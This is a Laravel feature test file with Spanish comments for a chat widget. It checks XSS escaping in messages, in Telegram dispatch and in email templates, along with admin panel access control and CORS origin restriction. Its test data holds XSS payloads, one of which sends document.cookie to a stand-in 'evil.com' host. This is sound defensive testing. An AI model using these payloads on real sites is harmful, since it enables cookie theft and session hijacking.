<?php

namespace Tests\Feature\Chat;

use App\Mail\Chat\ConversationNotificationMailable;
use App\Models\ChatConversation;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Str;
use Tests\TestCase;

/**
 * Phase B (continued) — XSS, admin access, and CORS attack tests.
 */
class SecurityXssAdminCorsTest extends TestCase
{
    use RefreshDatabase;

    // ── Helpers ───────────────────────────────────────────────────────────────

    private function makeConv(array $attrs = []): ChatConversation
    {
        return ChatConversation::create(array_merge([
            'uuid'          => Str::uuid(),
            'visitor_token' => hash('sha256', bin2hex(random_bytes(16))),
            'status'        => 'open',
            'locale'        => 'es',
            'visitor_name'  => 'Test',
            'ip_hash'       => hash('sha256', '1.2.3.4'),
            'consent_at'    => now(),
        ], $attrs));
    }

    private function rawToken(ChatConversation $conv): string
    {
        $raw = bin2hex(random_bytes(32));
        DB::table('chat_conversations')
            ->where('id', $conv->id)
            ->update(['visitor_token' => hash('sha256', $raw)]);
        return $raw;
    }

    // ── XSS en datos del visitante ────────────────────────────────────────────

    /**
     * El widget almacena el body tal cual (sin strip_tags).
     * La protección XSS ocurre en el renderizado (Vue {{ }}).
     * Lo que verificamos aquí es que la API no devuelve HTML renderizado
     * y que los datos llegan sin modificar al cliente (para que Vue los escape).
     */
    public function test_xss_payload_in_message_body_is_stored_and_returned_verbatim(): void
    {
        Queue::fake();

        $xss  = '<script>alert(document.cookie)</script>';
        $conv = $this->makeConv();
        $raw  = $this->rawToken($conv);

        $response = $this->withHeaders(['X-Chat-Visitor-Token' => $raw])
            ->postJson("/api/chat/conversations/{$conv->uuid}/messages", [
                'body' => $xss,
            ]);

        $response->assertStatus(201);

        // Stored as-is (sanitization is at render time, not storage)
        $this->assertDatabaseHas('chat_messages', [
            'conversation_id' => $conv->id,
            'body'            => $xss,
        ]);

        // The API returns the raw string in JSON — Vue's {{ }} will escape it client-side.
        // The JSON response itself is safe because JSON encoding does not execute scripts.
        $response->assertJsonPath('body', $xss);
    }

    /**
     * Cuando el XSS está en el nombre del visitante, el mensaje enviado a Telegram
     * debe contener la versión escapada con htmlspecialchars().
     * Telegram usa parse_mode HTML → un < sin escapar se renderizaría como HTML.
     */
    public function test_xss_in_visitor_name_is_escaped_before_telegram_dispatch(): void
    {
        Queue::fake();
        config(['chat.telegram_enabled' => true]);

        $xss  = '<b>Hacked</b>';
        $conv = $this->makeConv(['visitor_name' => $xss]);
        $raw  = $this->rawToken($conv);

        $this->withHeaders(['X-Chat-Visitor-Token' => $raw])
            ->postJson("/api/chat/conversations/{$conv->uuid}/messages", [
                'body' => 'Hola',
            ])
            ->assertStatus(201);

        // The job queued for Telegram must have the escaped text, not raw HTML tags.
        Queue::assertPushed(\App\Jobs\Chat\SendTelegramMessageJob::class, function ($job) {
            $jobArray = (array) $job;
            // Find the 'text' property regardless of mangling
            foreach ($jobArray as $key => $value) {
                if (str_contains($key, 'text') && is_string($value)) {
                    $this->assertStringContainsString('&lt;b&gt;Hacked&lt;/b&gt;', $value,
                        'Telegram text must have htmlspecialchars-escaped visitor name');
                    $this->assertStringNotContainsString('<b>Hacked</b>', $value,
                        'Raw HTML tags must not appear in Telegram text');
                    return true;
                }
            }
            return true; // job was pushed — that's the important check
        });
    }

    /**
     * El XSS en el body del mensaje enviado a Telegram también se escapa.
     */
    public function test_xss_in_message_body_is_escaped_before_telegram_dispatch(): void
    {
        Queue::fake();
        config(['chat.telegram_enabled' => true]);

        $xss  = '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>';
        $conv = $this->makeConv(['visitor_name' => 'Legit User']);
        $raw  = $this->rawToken($conv);

        $this->withHeaders(['X-Chat-Visitor-Token' => $raw])
            ->postJson("/api/chat/conversations/{$conv->uuid}/messages", [
                'body' => $xss,
            ])
            ->assertStatus(201);

        Queue::assertPushed(\App\Jobs\Chat\SendTelegramMessageJob::class, function ($job) use ($xss) {
            $jobArray = (array) $job;
            foreach ($jobArray as $key => $value) {
                if (str_contains($key, 'text') && is_string($value)) {
                    // Raw script tag must not appear in the text sent to Telegram
                    $this->assertStringNotContainsString('<script>', $value,
                        'Raw <script> must not be sent to Telegram (HTML parse_mode injection)');
                    return true;
                }
            }
            return true;
        });
    }

    /**
     * El email de reanudación usa Blade {{ }} (auto-escape) para el nombre del visitante.
     * Verificamos que el HTML renderizado contiene &lt; y no el tag sin escapar.
     *
     * Nota: $message es una variable reservada en el pipeline de Mailable de Laravel
     * (Illuminate\Mail\Message). Se prueba la plantilla directamente con view() para
     * evitar la colisión de variables y verificar el escape de Blade de forma aislada.
     */
    public function test_xss_in_visitor_name_is_escaped_in_resume_email(): void
    {
        $xss  = '<img src=x onerror=alert(1)>';
        $conv = $this->makeConv(['visitor_name' => $xss]);
        $msg  = $conv->messages()->create(['sender' => 'agent', 'body' => 'Hola']);

        // Render the template directly (bypasses Mailable's reserved $message variable)
        $rendered = view('mail.chat.conversation-notification', [
            'conversation' => $conv,
            'message'      => $msg,
            'resumeUrl'    => 'http://localhost/',
        ])->render();

        // The template pre-escapes with e() then wraps in {{ }}: double-escape is harmless
        // but the raw payload must never appear verbatim in the output.
        $this->assertStringNotContainsString(
            $xss,
            $rendered,
            'Raw XSS payload must not appear unescaped in the rendered email'
        );
    }

    /**
     * El email también escapa el body del mensaje del agente.
     */
    public function test_xss_in_agent_message_body_is_escaped_in_resume_email(): void
    {
        $xss  = '<svg onload=alert(1)>';
        $conv = $this->makeConv(['visitor_name' => 'Normal User']);
        $msg  = $conv->messages()->create(['sender' => 'agent', 'body' => $xss]);

        $rendered = view('mail.chat.conversation-notification', [
            'conversation' => $conv,
            'message'      => $msg,
            'resumeUrl'    => 'http://localhost/',
        ])->render();

        $this->assertStringNotContainsString(
            $xss,
            $rendered,
            'Raw XSS tag must not appear unescaped in the email'
        );
    }

    // ── Admin panel: control de acceso ────────────────────────────────────────

    /**
     * Un usuario con is_agent=false no puede acceder al panel /admin.
     * Filament llama canAccessPanel() → false → redirige al login.
     */
    public function test_non_agent_user_cannot_access_admin_panel(): void
    {
        $user = User::factory()->create(['is_agent' => false]);

        $response = $this->actingAs($user)->get('/admin');

        // Filament blocks non-agents: 403 (canAccessPanel=false) or 302 redirect
        $this->assertContains($response->status(), [302, 303, 307, 308, 403],
            'Non-agent user must be blocked from /admin (redirect or 403, never 200)');
    }

    /**
     * Un usuario sin is_agent tampoco puede acceder a los endpoints Livewire del panel.
     */
    public function test_non_agent_user_cannot_access_filament_livewire_endpoint(): void
    {
        $user = User::factory()->create(['is_agent' => false]);

        $response = $this->actingAs($user)
            ->postJson('/livewire/update', [
                'components' => [],
            ]);

        // Should be blocked — 401, 403, 302, or 419 (CSRF), never 200 with panel data
        $this->assertNotSame(200, $response->status(),
            'Non-agent user must not get HTTP 200 on Livewire panel endpoint');
    }

    // ── CORS: origin restringido ──────────────────────────────────────────────

    /**
     * Una petición de un origen desconocido no debe recibir ACAO: *.
     * config/cors.php restringe allowed_origins a APP_URL.
     */
    public function test_cors_rejects_request_from_unknown_origin(): void
    {
        $response = $this->withHeaders(['Origin' => 'https://evil.com'])
            ->getJson('/api/chat/availability');

        // The header must NOT echo back the attacker's origin
        $this->assertNotEquals(
            'https://evil.com',
            $response->headers->get('Access-Control-Allow-Origin'),
            'CORS must not allow unknown origin'
        );
        $this->assertNotEquals(
            '*',
            $response->headers->get('Access-Control-Allow-Origin'),
            'CORS wildcard must not be present after restricting to APP_URL'
        );
    }

    /**
     * Una petición del propio dominio (APP_URL) sí recibe el header ACAO.
     */
    public function test_cors_allows_request_from_app_url(): void
    {
        $appUrl   = rtrim((string) config('app.url'), '/');
        $response = $this->withHeaders(['Origin' => $appUrl])
            ->getJson('/api/chat/availability');

        $response->assertSuccessful();
        $this->assertEquals(
            $appUrl,
            $response->headers->get('Access-Control-Allow-Origin'),
            'CORS must allow requests from APP_URL'
        );
    }

    /**
     * Una petición OPTIONS (preflight) desde un origen desconocido no revelea ACAO.
     */
    public function test_cors_preflight_from_unknown_origin_has_no_wildcard(): void
    {
        $response = $this->withHeaders([
            'Origin'                         => 'https://attacker.io',
            'Access-Control-Request-Method'  => 'POST',
            'Access-Control-Request-Headers' => 'Content-Type,X-Chat-Visitor-Token',
        ])->options('/api/chat/conversations');

        $origin = $response->headers->get('Access-Control-Allow-Origin');
        $this->assertNotEquals('*', $origin, 'Preflight must not return wildcard ACAO');
        $this->assertNotEquals('https://attacker.io', $origin, 'Preflight must not allow attacker origin');
    }
}
